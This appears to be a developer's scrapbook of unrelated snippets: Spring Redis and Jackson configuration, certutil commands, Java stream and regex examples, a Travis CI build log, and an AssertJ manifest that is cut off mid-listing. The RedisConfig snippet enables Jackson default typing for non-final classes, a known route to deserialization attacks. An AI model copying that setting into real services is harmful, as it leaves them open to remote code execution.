            context.addAbstractTypeResolver(
                new SimpleAbstractTypeResolver().addMapping(MyInterface.class,
                                                            MyInterfaceImpl.class)
            );
        }
    });
}
IdPropertyIdentifierAccessor
--------------------------------------------------------------------------------------------------------
spring:
  boot:
    admin:
      client:
        url: http://spring-boot-admin-server-url:8080
        instance:
          service-url: http://you-application-url:8080
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonAutoDetect;
import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.CachingConfigurerSupport;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.StringRedisSerializer;

/**
 * @author cwenao
 * @version $Id RedisConfig.java, v 0.1 2017-01-29 15:17 cwenao Exp $$
 */
@Configuration
@EnableCaching
@AutoConfigureAfter({DataConfig.class,MybatisConfig.class})
public class RedisConfig extends CachingConfigurerSupport{

    @Bean(name="redisTemplate")
    public RedisTemplate<String, String> redisTemplate(RedisConnectionFactory factory) {

        RedisTemplate<String, String> template = new RedisTemplate<>();


        RedisSerializer<String> redisSerializer = new StringRedisSerializer();

        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);

        template.setConnectionFactory(factory);
        //key序列化方式
        template.setKeySerializer(redisSerializer);
        //value序列化
        template.setValueSerializer(jackson2JsonRedisSerializer);
        //value hashmap序列化
        template.setHashValueSerializer(jackson2JsonRedisSerializer);

        return template;
    }

    @Bean
    public CacheManager cacheManager(@SuppressWarnings("rawtypes")RedisTemplate redisTemplate) {
        final RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate);
        cacheManager.setDefaultExpiration(3000);
        return cacheManager;
    }
}
--------------------------------------------------------------------------------------------------------
List locally trusted certifcates
certutil -d sql:$HOME/.pki/nssdb -L
Add locally trusted certifcate
certutil -d sql:$HOME/.pki/nssdb -D -t "P,," -n ~/Downloads/apps.tdlabs.local.crt -i ~/Downloads/apps.tdlabs.local.crt
Delete locally tristed certificate
certutil -d sql:$HOME/.pki/nssdb -D -n app1
--------------------------------------------------------------------------------------------------------
RedisCluster.builder()
                .sentinelPorts(redisSentinels) //btw, order counts here, if you set ports after setting replication groups
                .serverPorts(redisHosts) //you will get different ports. Go figure
                .withServerBuilder(new CustomClusterRedisServerBuilder().setting("maxmemory 128").setting("maxheap 128M")) //same goes for settings
                .withSentinelBuilder(RedisSentinel.builder().setting("maxmemory 128").setting("maxheap 128M"))
                .sentinelCount(3)
                .quorumSize(2)
                .replicationGroup("master1", 1)
                .replicationGroup("master2", 1)
                .replicationGroup("master3", 1)
                .build()
--------------------------------------------------------------------------------------------------------
Usage: ./redis-server [/path/to/redis.conf]
       ./redis-server - (read config from stdin)
       ./redis-server --test-memory <megabytes>
--------------------------------------------------------------------------------------------------------
curl -Lo jsoup.zip https://github.com/jhy/jsoup/archive/master.zip
unzip jsoup.zip
cd jsoup-master
mvn install
--------------------------------------------------------------------------------------------------------
String cleanedHTML = Jsoup.clean(strHTML, Whitelist.none());
String cleanedHTML = Jsoup.clean(strHTML, Whitelist.relaxed());
String str = Jsoup.clean(strHTML, Whitelist.none().addTags("div"));
--------------------------------------------------------------------------------------------------------
Collection< PublicationSession > wantedPublications = 
    effectiveDatePublicationMap.values() // Collection<List<PublicationSession>>
                               .stream() // Stream<List<PublicationSession>>
                               .flatMap(list->list.stream()) // Stream<PublicationSession>
                               .filter(pub -> PublicationStatus.valueOf(pub.getPublishStatus()) == PublicationStatus.COMPLETE)
                               .sorted(Comparator.comparing(PublicationSession::getCreateTime))
                               .collect(toMap(p -> p.getPublicationSession().getEffDateTime(), UnaryOperator.identity(), PICK_LATEST))
                               .values();
							   
List<String> destList = new ArrayList<>(Arrays.asList("foo"));
List<String> newList = Arrays.asList("0", "1", "2", "3", "4", "5");
newList.parallelStream()
       .collect(Collectors.toCollection(() -> destList));
System.out.println(destList);
--------------------------------------------------------------------------------------------------------
Worker information
hostname: 4c9e34bc-1fb8-4cd3-bf1b-6b2010d9e6d3@1.production-1-worker-org-gce-1hv2
version: v6.2.0 https://github.com/travis-ci/worker/tree/5e5476e01646095f48eec13196fdb3faf8f5cbf7
instance: travis-job-d0317f09-5637-4bd3-b60b-51bf4b72ad81 travis-ci-garnet-trusty-1512502259-986baf0 (via amqp)
startup: 6.871559117s
system_info
Build system information
Build language: java
Build group: stable
Build dist: trusty
Build id: 543259452
Job id: 543259454
Runtime kernel version: 4.4.0-101-generic
travis-build version: 9f4eb462c
Build image provisioning date and time
Tue Dec  5 19:58:13 UTC 2017
Operating System Details
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
Cookbooks Version
7c2c6a6 https://github.com/travis-ci/travis-cookbooks/tree/7c2c6a6
git version
git version 2.15.1
bash version
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
gcc version
gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
docker version
Client:
 Version:      17.09.0-ce
 API version:  1.32
 Go version:   go1.8.3
 Git commit:   afdb6d4
 Built:        Tue Sep 26 22:42:38 2017
 OS/Arch:      linux/amd64
Server:
 Version:      17.09.0-ce
 API version:  1.32 (minimum version 1.12)
 Go version:   go1.8.3
 Git commit:   afdb6d4
 Built:        Tue Sep 26 22:41:20 2017
 OS/Arch:      linux/amd64
 Experimental: false
clang version
clang version 5.0.0 (tags/RELEASE_500/final)
Target: x86_64-unknown-linux-gnu
Thread model: posix
InstalledDir: /usr/local/clang-5.0.0/bin
jq version
jq-1.5
bats version
Bats 0.4.0
shellcheck version
0.4.6
shfmt version
v2.0.0
ccache version
ccache version 3.1.9
Copyright (C) 2002-2007 Andrew Tridgell
Copyright (C) 2009-2011 Joel Rosdahl
This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 3 of the License, or (at your option) any later
version.
cmake version
cmake version 3.9.2
CMake suite maintained and supported by Kitware (kitware.com/cmake).
heroku version
heroku-cli/6.14.39-addc925 (linux-x64) node-v9.2.0
imagemagick version
Version: ImageMagick 6.7.7-10 2017-07-31 Q16 http://www.imagemagick.org
md5deep version
4.2
mercurial version
Mercurial Distributed SCM (version 4.2.2)
(see https://mercurial-scm.org for more information)
Copyright (C) 2005-2017 Matt Mackall and others
This is free software; see the source for copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
mysql version
mysql  Ver 14.14 Distrib 5.6.33, for debian-linux-gnu (x86_64) using  EditLine wrapper
openssl version
OpenSSL 1.0.1f 6 Jan 2014
packer version
Packer v1.0.2
Your version of Packer is out of date! The latest version
is 1.1.2. You can update by downloading from www.packer.io
postgresql client version
psql (PostgreSQL) 9.6.6
ragel version
Ragel State Machine Compiler version 6.8 Feb 2013
Copyright (c) 2001-2009 by Adrian Thurston
subversion version
svn, version 1.8.8 (r1568071)
   compiled Aug 10 2017, 17:20:39 on x86_64-pc-linux-gnu
Copyright (C) 2013 The Apache Software Foundation.
This software consists of contributions made by many people;
see the NOTICE file for more information.
Subversion is open source software, see http://subversion.apache.org/
The following repository access (RA) modules are available:
* ra_svn : Module for accessing a repository using the svn network protocol.
  - with Cyrus SASL authentication
  - handles 'svn' scheme
* ra_local : Module for accessing a repository on local disk.
  - handles 'file' scheme
* ra_serf : Module for accessing a repository via WebDAV protocol using serf.
  - using serf 1.3.3
  - handles 'http' scheme
  - handles 'https' scheme
sudo version
Sudo version 1.8.9p5
Configure options: --prefix=/usr -v --with-all-insults --with-pam --with-fqdn --with-logging=syslog --with-logfac=authpriv --with-env-editor --with-editor=/usr/bin/editor --with-timeout=15 --with-password-timeout=0 --with-passprompt=[sudo] password for %p:  --without-lecture --with-tty-tickets --disable-root-mailer --enable-admin-flag --with-sendmail=/usr/sbin/sendmail --with-timedir=/var/lib/sudo --mandir=/usr/share/man --libexecdir=/usr/lib/sudo --with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu --with-selinux
Sudoers policy plugin version 1.8.9p5
Sudoers file grammar version 43
Sudoers path: /etc/sudoers
Authentication methods: 'pam'
Syslog facility if syslog is being used for logging: authpriv
Syslog priority to use when user authenticates successfully: notice
Syslog priority to use when user authenticates unsuccessfully: alert
Send mail if the user is not in sudoers
Use a separate timestamp for each user/tty combo
Lecture user the first time they run sudo
Root may run sudo
Allow some information gathering to give useful error messages
Require fully-qualified hostnames in the sudoers file
Visudo will honor the EDITOR environment variable
Set the LOGNAME and USER environment variables
Length at which to wrap log file lines (0 for no wrap): 80
Authentication timestamp timeout: 15.0 minutes
Password prompt timeout: 0.0 minutes
Number of tries to enter a password: 3
Umask to use or 0777 to use user's: 022
Path to mail program: /usr/sbin/sendmail
Flags for mail program: -t
Address to send mail to: root
Subject line for mail messages: *** SECURITY information for %h ***
Incorrect password message: Sorry, try again.
Path to authentication timestamp dir: /var/lib/sudo
Default password prompt: [sudo] password for %p: 
Default user to run commands as: root
Value to override user's $PATH with: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
Path to the editor for use by visudo: /usr/bin/editor
When to require a password for 'list' pseudocommand: any
When to require a password for 'verify' pseudocommand: all
File descriptors >= 3 will be closed before executing a command
Environment variables to check for sanity:
	TZ
	TERM
	LINGUAS
	LC_*
	LANGUAGE
	LANG
	COLORTERM
Environment variables to remove:
	RUBYOPT
	RUBYLIB
	PYTHONUSERBASE
	PYTHONINSPECT
	PYTHONPATH
	PYTHONHOME
	TMPPREFIX
	ZDOTDIR
	READNULLCMD
	NULLCMD
	FPATH
	PERL5DB
	PERL5OPT
	PERL5LIB
	PERLLIB
	PERLIO_DEBUG 
	JAVA_TOOL_OPTIONS
	SHELLOPTS
	GLOBIGNORE
	PS4
	BASH_ENV
	ENV
	TERMCAP
	TERMPATH
	TERMINFO_DIRS
	TERMINFO
	_RLD*
	LD_*
	PATH_LOCALE
	NLSPATH
	HOSTALIASES
	RES_OPTIONS
	LOCALDOMAIN
	CDPATH
	IFS
Environment variables to preserve:
	JAVA_HOME
	TRAVIS
	CI
	DEBIAN_FRONTEND
	XAUTHORIZATION
	XAUTHORITY
	PS2
	PS1
	PATH
	LS_COLORS
	KRB5CCNAME
	HOSTNAME
	HOME
	DISPLAY
	COLORS
Locale to use while parsing sudoers: C
Directory in which to store input/output logs: /var/log/sudo-io
File in which to store the input/output log: %{seq}
Add an entry to the utmp/utmpx file when allocating a pty
PAM service name to use
PAM service name to use for login shells
Create a new PAM session for the command to run in
Maximum I/O log sequence number: 0
Local IP address and netmask pairs:
	10.240.0.28/255.255.255.255
	172.17.0.1/255.255.0.0
Sudoers I/O plugin version 1.8.9p5
gzip version
gzip 1.6
Copyright (C) 2007, 2010, 2011 Free Software Foundation, Inc.
Copyright (C) 1993 Jean-loup Gailly.
This is free software.  You may redistribute copies of it under the terms of
the GNU General Public License <http://www.gnu.org/licenses/gpl.html>.
There is NO WARRANTY, to the extent permitted by law.
Written by Jean-loup Gailly.
zip version
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
This is Zip 3.0 (July 5th 2008), by Info-ZIP.
Currently maintained by E. Gordon.  Please send bug reports to
the authors using the web page at www.info-zip.org; see README for details.
Latest sources and executables are at ftp://ftp.info-zip.org/pub/infozip,
as of above date; see http://www.info-zip.org/ for other sites.
Compiled with gcc 4.8.2 for Unix (Linux ELF) on Oct 21 2013.
Zip special compilation options:
	USE_EF_UT_TIME       (store Universal Time)
	BZIP2_SUPPORT        (bzip2 library version 1.0.6, 6-Sept-2010)
	    bzip2 code and library copyright (c) Julian R Seward
	    (See the bzip2 license for terms of use)
	SYMLINK_SUPPORT      (symbolic links supported)
	LARGE_FILE_SUPPORT   (can read and write large files on file system)
	ZIP64_SUPPORT        (use Zip64 to store large files in archives)
	UNICODE_SUPPORT      (store and read UTF-8 Unicode paths)
	STORE_UNIX_UIDs_GIDs (store UID/GID sizes/values using new extra field)
	UIDGID_NOT_16BIT     (old Unix 16-bit UID/GID extra field not used)
	[encryption, version 2.91 of 05 Jan 2007] (modified for Zip 3)
Encryption notice:
	The encryption code of this program is not copyrighted and is
	put in the public domain.  It was originally written in Europe
	and, to the best of our knowledge, can be freely distributed
	in both source and object forms from any country, including
	the USA under License Exception TSU of the U.S. Export
	Administration Regulations (section 740.13(e)) of 6 June 2002.
Zip environment options:
             ZIP:  [none]
          ZIPOPT:  [none]
vim version
VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Nov 24 2016 16:43:18)
Included patches: 1-52
Extra patches: 8.0.0056
Modified by pkg-vim-maintainers@lists.alioth.debian.org
Compiled by buildd@
Huge version without GUI.  Features included (+) or not (-):
+acl             +farsi           +mouse_netterm   +syntax
+arabic          +file_in_path    +mouse_sgr       +tag_binary
+autocmd         +find_in_path    -mouse_sysmouse  +tag_old_static
-balloon_eval    +float           +mouse_urxvt     -tag_any_white
-browse          +folding         +mouse_xterm     -tcl
++builtin_terms  -footer          +multi_byte      +terminfo
+byte_offset     +fork()          +multi_lang      +termresponse
+cindent         +gettext         -mzscheme        +textobjects
-clientserver    -hangul_input    +netbeans_intg   +title
-clipboard       +iconv           +path_extra      -toolbar
+cmdline_compl   +insert_expand   -perl            +user_commands
+cmdline_hist    +jumplist        +persistent_undo +vertsplit
+cmdline_info    +keymap          +postscript      +virtualedit
+comments        +langmap         +printer         +visual
+conceal         +libcall         +profile         +visualextra
+cryptv          +linebreak       +python          +viminfo
+cscope          +lispindent      -python3         +vreplace
+cursorbind      +listcmds        +quickfix        +wildignore
+cursorshape     +localmap        +reltime         +wildmenu
+dialog_con      -lua             +rightleft       +windows
+diff            +menu            -ruby            +writebackup
+digraphs        +mksession       +scrollbind      -X11
-dnd             +modify_fname    +signs           -xfontset
-ebcdic          +mouse           +smartindent     -xim
+emacs_tags      -mouseshape      -sniff           -xsmp
+eval            +mouse_dec       +startuptime     -xterm_clipboard
+ex_extra        +mouse_gpm       +statusline      -xterm_save
+extra_search    -mouse_jsbterm   -sun_workshop    -xpm
   system vimrc file: "$VIM/vimrc"
     user vimrc file: "$HOME/.vimrc"
 2nd user vimrc file: "~/.vim/vimrc"
      user exrc file: "$HOME/.exrc"
  fall-back for $VIM: "/usr/share/vim"
Compilation: gcc -c -I. -Iproto -DHAVE_CONFIG_H     -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1      
Linking: gcc   -Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,--as-needed -o vim        -lm -ltinfo -lnsl  -lselinux  -lacl -lattr -lgpm -ldl    -L/usr/lib/python2.7/config-x86_64-linux-gnu -lpython2.7 -lpthread -ldl -lutil -lm -Xlinker -export-dynamic -Wl,-O1 -Wl,-Bsymbolic-functions      
iptables version
iptables v1.4.21
curl version
curl 7.35.0 (x86_64-pc-linux-gnu) libcurl/7.35.0 OpenSSL/1.0.1f zlib/1.2.8 libidn/1.28 librtmp/2.3
wget version
GNU Wget 1.15 built on linux-gnu.
rsync version
rsync  version 3.1.0  protocol version 31
gimme version
v1.2.0
nvm version
0.33.6
perlbrew version
/home/travis/perl5/perlbrew/bin/perlbrew  - App::perlbrew/0.80
phpenv version
rbenv 1.1.1-25-g6aa70b6
rvm version
rvm 1.29.3 (latest) by Michal Papis, Piotr Kuczynski, Wayne E. Seguin [https://rvm.io]
default ruby version
ruby 2.4.1p111 (2017-03-22 revision 58053) [x86_64-linux]
CouchDB version
couchdb 1.6.1
ElasticSearch version
5.5.0
Installed Firefox version
firefox 56.0.2
MongoDB version
MongoDB 3.4.10
PhantomJS version
2.1.1
Pre-installed PostgreSQL versions
9.2.24
9.3.20
9.4.15
9.5.10
9.6.6
RabbitMQ Version
3.6.14
Redis version
redis-server 4.0.6
riak version
2.2.3
Pre-installed Go versions
1.7.4
ant version
Apache Ant(TM) version 1.9.3 compiled on April 8 2014
mvn version
Apache Maven 3.5.2 (138edd61fd100ec658bfa2d307c43b76940a5d7d; 2017-10-18T07:58:13Z)
Maven home: /usr/local/maven-3.5.2
Java version: 1.8.0_151, vendor: Oracle Corporation
Java home: /usr/lib/jvm/java-8-oracle/jre
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "4.4.0-98-generic", arch: "amd64", family: "unix"
gradle version
------------------------------------------------------------
Gradle 4.0.1
------------------------------------------------------------
Build time:   2017-07-07 14:02:41 UTC
Revision:     38e5dc0f772daecca1d2681885d3d85414eb6826
Groovy:       2.4.11
Ant:          Apache Ant(TM) version 1.9.6 compiled on June 29 2015
JVM:          1.8.0_151 (Oracle Corporation 25.151-b12)
OS:           Linux 4.4.0-98-generic amd64
lein version
Leiningen 2.8.1 on Java 1.8.0_151 Java HotSpot(TM) 64-Bit Server VM
Pre-installed Node.js versions
v4.8.6
v6.12.0
v6.12.1
v8.9
v8.9.1
phpenv versions
  system
  5.6
* 5.6.32 (set by /home/travis/.phpenv/version)
  7.0
  7.0.25
  7.1
  7.1.11
  hhvm
  hhvm-stable
composer --version
Composer version 1.5.2 2017-09-11 16:59:25
Pre-installed Ruby versions
ruby-2.2.7
ruby-2.3.4
ruby-2.4.1
docker_mtu
docker stop/waiting
docker start/running, process 4483
resolvconf
resolvconf stop/waiting
resolvconf start/running
Installing openjdk11
$ export JAVA_HOME=~/openjdk11
$ export PATH="$JAVA_HOME/bin:$PATH"
$ ~/bin/install-jdk.sh --target "/home/travis/openjdk11" --workspace "/home/travis/.cache/install-jdk" --feature "11" --license "GPL" --cacerts
install-jdk.sh 2019-05-02
The command "~/bin/install-jdk.sh --target "/home/travis/openjdk11" --workspace "/home/travis/.cache/install-jdk" --feature "11" --license "GPL" --cacerts" failed and exited with 7 during .
Your build has been stopped.
--------------------------------------------------------------------------------------------------------
Line 1
Line 2
Line 3
Line 4
This expression --- is contained in this line 5
Line 6
Line 7
Line 8
WORD begins that line 9
Line 10
Line 11
Line 12

\A(?s).*?WORD(?-s).*\R
\A(?s).*WORD(?-s).*\R
(?s).*?WORD(?-s).*\R
(?s).*WORD(?-s).*\R
(?s-i).*\R\K.*WORD.*

(?<=Name\s).*(?=\sAge)
\A(?s)(.*?)\K(WORD)

    Count((?-s)^.{N,}) give all lines containing, at least, N character(s)
    Count ((?-s)^.{M,N}$) give all lines containing, between M and N character(s)
    Count ((?-s)^.{1,N}$) give all lines containing, at most, N characters(s)
--------------------------------------------------------------------------------------------------------
C[] cs = (C[]) new Object[as.length];
Arrays.setAll(cs, i -> op.apply(as[i], bs[i]));

C[] cs = (C[])IntStream.range(0, as.length)
                       .mapToObj(i -> op.apply(as[i], bs[i]))
                       .toArray();
--------------------------------------------------------------------------------------------------------
String[] stringArray = stringStream.toArray(String[]::new);
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Build-Jdk: 1.8.0_161
Built-By: joel
Bundle-Description: Rich and fluent assertions for testing for Java
Bundle-DocURL: joel-costigliola.github.io/assertj/index.html
Bundle-License: http://www.apache.org/licenses/LICENSE-2.0.txt
Bundle-ManifestVersion: 2
Bundle-Name: AssertJ fluent assertions
Bundle-RequiredExecutionEnvironment: JavaSE-1.8
Bundle-SymbolicName: org.assertj.core
Bundle-Vendor: AssertJ
Bundle-Version: 3.9.1
Created-By: Apache Maven Bundle Plugin
Export-Package: org.assertj.core.api;version="3.9.1";uses:="org.assertj.
 core.api.filter,org.assertj.core.api.iterable,org.assertj.core.conditio
 n,org.assertj.core.data,org.assertj.core.description,org.assertj.core.e
 rror,org.assertj.core.groups,org.assertj.core.internal,org.assertj.core
 .internal.bytebuddy.implementation.bind.annotation,org.assertj.core.pre
 sentation",org.assertj.core.api.exception;version="3.9.1",org.assertj.c
 ore.api.filter;version="3.9.1";uses:="org.assertj.core.api",org.assertj
 .core.api.iterable;version="3.9.1",org.assertj.core.condition;version="
 3.9.1";uses:="org.assertj.core.api",org.assertj.core.configuration;vers
 ion="3.9.1";uses:="org.assertj.core.presentation",org.assertj.core.data
 ;version="3.9.1",org.assertj.core.description;version="3.9.1",org.asser
 tj.core.error;version="3.9.1";uses:="org.assertj.core.api,org.assertj.c
 ore.data,org.assertj.core.description,org.assertj.core.groups,org.asser
 tj.core.internal,org.assertj.core.presentation,org.assertj.core.util.di
 ff",org.assertj.core.error.future;version="3.9.1";uses:="org.assertj.co
 re.error",org.assertj.core.error.uri;version="3.9.1";uses:="org.assertj
 .core.error",org.assertj.core.extractor;version="3.9.1";uses:="org.asse
 rtj.core.api.iterable,org.assertj.core.groups",org.assertj.core.groups;
 version="3.9.1";uses:="org.assertj.core.api.iterable",org.assertj.core.
 internal;uses:="org.assertj.core.api,org.assertj.core.data,org.assertj.
 core.error,org.assertj.core.presentation,org.assertj.core.util.diff";ve
 rsion="3.9.1",org.assertj.core.internal.bytebuddy;uses:="org.assertj.co
 re.internal.bytebuddy.description.method,org.assertj.core.internal.byte
 buddy.description.type,org.assertj.core.internal.bytebuddy.dynamic,org.
 assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.inter
 nal.bytebuddy.dynamic.scaffold.inline,org.assertj.core.internal.bytebud
 dy.dynamic.scaffold.subclass,org.assertj.core.internal.bytebuddy.implem
 entation,org.assertj.core.internal.bytebuddy.implementation.attribute,o
 rg.assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj
 .core.internal.bytebuddy.implementation.bytecode,org.assertj.core.inter
 nal.bytebuddy.jar.asm,org.assertj.core.internal.bytebuddy.matcher";vers
 ion="3.9.1",org.assertj.core.internal.bytebuddy.agent.builder;uses:="or
 g.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.a
 sm,org.assertj.core.internal.bytebuddy.build,org.assertj.core.internal.
 bytebuddy.description.field,org.assertj.core.internal.bytebuddy.descrip
 tion.method,org.assertj.core.internal.bytebuddy.description.type,org.as
 sertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal.bytebud
 dy.dynamic.loading,org.assertj.core.internal.bytebuddy.dynamic.scaffold
 ,org.assertj.core.internal.bytebuddy.dynamic.scaffold.inline,org.assert
 j.core.internal.bytebuddy.implementation,org.assertj.core.internal.byte
 buddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.imple
 mentation.bytecode.assign,org.assertj.core.internal.bytebuddy.jar.asm,o
 rg.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal.by
 tebuddy.pool,org.assertj.core.internal.bytebuddy.utility";version="3.9.
 1",org.assertj.core.internal.bytebuddy.asm;uses:="org.assertj.core.inte
 rnal.bytebuddy,org.assertj.core.internal.bytebuddy.description,org.asse
 rtj.core.internal.bytebuddy.description.annotation,org.assertj.core.int
 ernal.bytebuddy.description.enumeration,org.assertj.core.internal.byteb
 uddy.description.field,org.assertj.core.internal.bytebuddy.description.
 method,org.assertj.core.internal.bytebuddy.description.modifier,org.ass
 ertj.core.internal.bytebuddy.description.type,org.assertj.core.internal
 .bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.scaffold
 ,org.assertj.core.internal.bytebuddy.implementation,org.assertj.core.in
 ternal.bytebuddy.implementation.bytecode,org.assertj.core.internal.byte
 buddy.implementation.bytecode.assign,org.assertj.core.internal.bytebudd
 y.jar.asm,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.
 internal.bytebuddy.pool,org.assertj.core.internal.bytebuddy.utility.vis
 itor";version="3.9.1",org.assertj.core.internal.bytebuddy.build;uses:="
 org.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy
 .description.type,org.assertj.core.internal.bytebuddy.dynamic,org.asser
 tj.core.internal.bytebuddy.dynamic.scaffold.inline,org.assertj.core.int
 ernal.bytebuddy.matcher";version="3.9.1",org.assertj.core.internal.byte
 buddy.description;uses:="org.assertj.core.internal.bytebuddy.descriptio
 n.annotation,org.assertj.core.internal.bytebuddy.description.method,org
 .assertj.core.internal.bytebuddy.description.modifier,org.assertj.core.
 internal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy
 .matcher";version="3.9.1",org.assertj.core.internal.bytebuddy.descripti
 on.annotation;uses:="org.assertj.core.internal.bytebuddy.description.en
 umeration,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.matcher";version="3.9.1",org.assertj.core.internal.bytebudd
 y.description.enumeration;uses:="org.assertj.core.internal.bytebuddy.de
 scription,org.assertj.core.internal.bytebuddy.description.type";version
 ="3.9.1",org.assertj.core.internal.bytebuddy.description.field;uses:="o
 rg.assertj.core.internal.bytebuddy.description,org.assertj.core.interna
 l.bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy.
 description.type,org.assertj.core.internal.bytebuddy.matcher";version="
 3.9.1",org.assertj.core.internal.bytebuddy.description.method;uses:="or
 g.assertj.core.internal.bytebuddy.description,org.assertj.core.internal
 .bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy.d
 escription.modifier,org.assertj.core.internal.bytebuddy.description.typ
 e,org.assertj.core.internal.bytebuddy.matcher";version="3.9.1",org.asse
 rtj.core.internal.bytebuddy.description.modifier;version="3.9.1",org.as
 sertj.core.internal.bytebuddy.description.type;uses:="org.assertj.core.
 internal.bytebuddy.description,org.assertj.core.internal.bytebuddy.desc
 ription.annotation,org.assertj.core.internal.bytebuddy.description.fiel
 d,org.assertj.core.internal.bytebuddy.description.method,org.assertj.co
 re.internal.bytebuddy.implementation.bytecode,org.assertj.core.internal
 .bytebuddy.jar.asm.signature,org.assertj.core.internal.bytebuddy.matche
 r";version="3.9.1",org.assertj.core.internal.bytebuddy.dynamic;uses:="o
 rg.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.
 asm,org.assertj.core.internal.bytebuddy.description,org.assertj.core.in
 ternal.bytebuddy.description.annotation,org.assertj.core.internal.byteb
 uddy.description.field,org.assertj.core.internal.bytebuddy.description.
 method,org.assertj.core.internal.bytebuddy.description.modifier,org.ass
 ertj.core.internal.bytebuddy.description.type,org.assertj.core.internal
 .bytebuddy.dynamic.loading,org.assertj.core.internal.bytebuddy.dynamic.
 scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assertj
 .core.internal.bytebuddy.implementation.attribute,org.assertj.core.inte
 rnal.bytebuddy.implementation.auxiliary,org.assertj.core.internal.byteb
 uddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.as
 m,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal
 .bytebuddy.pool,org.assertj.core.internal.bytebuddy.utility";version="3
 .9.1",org.assertj.core.internal.bytebuddy.dynamic.loading;uses:="org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.matcher,org.ass
 ertj.core.internal.bytebuddy.utility";version="3.9.1",org.assertj.core.
 internal.bytebuddy.dynamic.scaffold;uses:="org.assertj.core.internal.by
 tebuddy,org.assertj.core.internal.bytebuddy.asm,org.assertj.core.intern
 al.bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy
 .description.field,org.assertj.core.internal.bytebuddy.description.meth
 od,org.assertj.core.internal.bytebuddy.description.modifier,org.assertj
 .core.internal.bytebuddy.description.type,org.assertj.core.internal.byt
 ebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.scaffold.inl
 ine,org.assertj.core.internal.bytebuddy.implementation,org.assertj.core
 .internal.bytebuddy.implementation.attribute,org.assertj.core.internal.
 bytebuddy.implementation.auxiliary,org.assertj.core.internal.bytebuddy.
 implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm,org
 .assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal.byte
 buddy.pool";version="3.9.1",org.assertj.core.internal.bytebuddy.dynamic
 .scaffold.inline;uses:="org.assertj.core.internal.bytebuddy,org.assertj
 .core.internal.bytebuddy.asm,org.assertj.core.internal.bytebuddy.descri
 ption.annotation,org.assertj.core.internal.bytebuddy.description.method
 ,org.assertj.core.internal.bytebuddy.description.type,org.assertj.core.
 internal.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.
 scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assertj
 .core.internal.bytebuddy.implementation.attribute,org.assertj.core.inte
 rnal.bytebuddy.implementation.auxiliary,org.assertj.core.internal.byteb
 uddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.as
 m,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal
 .bytebuddy.pool";version="3.9.1",org.assertj.core.internal.bytebuddy.dy
 namic.scaffold.subclass;uses:="org.assertj.core.internal.bytebuddy,org.
 assertj.core.internal.bytebuddy.asm,org.assertj.core.internal.bytebuddy
 .description.method,org.assertj.core.internal.bytebuddy.description.typ
 e,org.assertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal
